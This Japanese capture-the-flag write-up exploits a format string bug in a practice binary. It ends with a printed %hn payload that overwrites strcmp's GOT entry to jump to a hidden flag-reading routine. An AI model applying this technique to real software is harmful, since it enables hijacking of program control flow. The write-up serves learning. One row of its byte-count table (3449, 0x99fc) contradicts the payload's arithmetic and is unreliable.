# Villager A
1. check security 機構.
* 以下リポジトリにある shell を実行して、予めどの security 機構がかかっているか確認する。
  * checksec.sh: https://github.com/slimm609/checksec.sh
```
ssh q4@ctfq.u1tramarine.blue -p 10004 'bash -s ' < ~/ctf_tools/checksec.sh -- --file q4
  RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
  No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   q4
```

2. 用いられている lib func の確認.
```
ssh q4@ctfq.u1tramarine.blue -p 10004 'objdump -M intel -d q4 -j .plt' | less
```
* fgets, printf がある。また、1. の結果から、stackoverflow, format string attack あたりが狙えそう。
* assembly を見ると、fgets の入力が、printf に流れている。

3. format string attack が可能か確認する。
```
[q4@eceec62b961b ~]$ ./q4
What's your name?
AAAABBBB%p,%p,%p,%p,%p,%p,%p
Hi, AAAABBBB0x400,0xf7ca6580,0xff9acf18,0x6,(nil),0x41414141,0x42424242
```
* stack の中身にアクセス可能であることがわかる。
  * position 6, 7 が 入力"AAAABBBB" に対応。
* eip の移し先を考える。
  * assembly の後半で、fopen を呼んで中身を出力する処理がある。
  * 同 directory に、"flag.txt" があるので、おそらくこれを読みだせばよさそう。
* fopen の読みだしファイル名の確認.
  * objdump(disassembly) の結果より、引数に渡す文字列は"0x80487e8"にある。
```
[q4@eceec62b961b ~]$ gdb -q q4
(gdb) start
(gdb) x/1s 0x80487e8
0x80487e8:      "flag.txt"
```
* fopen の呼び出しに処理を移すことを考える。(通常、無限にループにかかって実行されない箇所にある。)
  * fsa(format string attack) が可能なので、lib func の got/plt を書き換えることでいけそう。

4. fsa で GOT overwrite する。
* target をstrcmp とする。
```
% ssh q4@ctfq.u1tramarine.blue -p 10004 'objdump -M intel -d q4 -j.plt' | grep -A 5 "strcmp"
q4@ctfq.u1tramarine.blue's password:
080484e4 <strcmp@plt>:
80484e4:       ff 25 fc 99 04 08       jmp    DWORD PTR ds:0x80499fc
80484ea:       68 40 00 00 00          push   0x40
80484ef:       e9 60 ff ff ff          jmp    8048454 <.plt>
```
* plt 参照時の adrs "0x80499fc" を書き換える。
  * jump 先を、fopen 前 "0x8048691" にする。
* position 6,7 の変数に、target adrs を入れ、'%hn' で2byteずつ書き込みを行う。
  * 以下のテーブルになるように入力を与える。
|      |  出力 byte  | total byte  |
| ---- | ---- | ---- |
|  target adrs 1  |  4  |  4  |
|  target adrs 2  |  4  |  8  |
|  %2044x  |  2044  |  2052 (0x0804)  |
|  %6$hn  |  0  |  2052 (0x0804)  |
|  %32397x  |  32397  |  3449 (0x99fc)  |
|  %7$hn  |  0  |  3449 (0x99fc)  |

```
[q4@eceec62b961b ~]$ (echo -e '\xfe\x99\x04\x08\xfc\x99\x04\x08%2044x%6$hn%32397x%7$hn\n'; cat) | ./q4
```
* flag が得られる。 done!

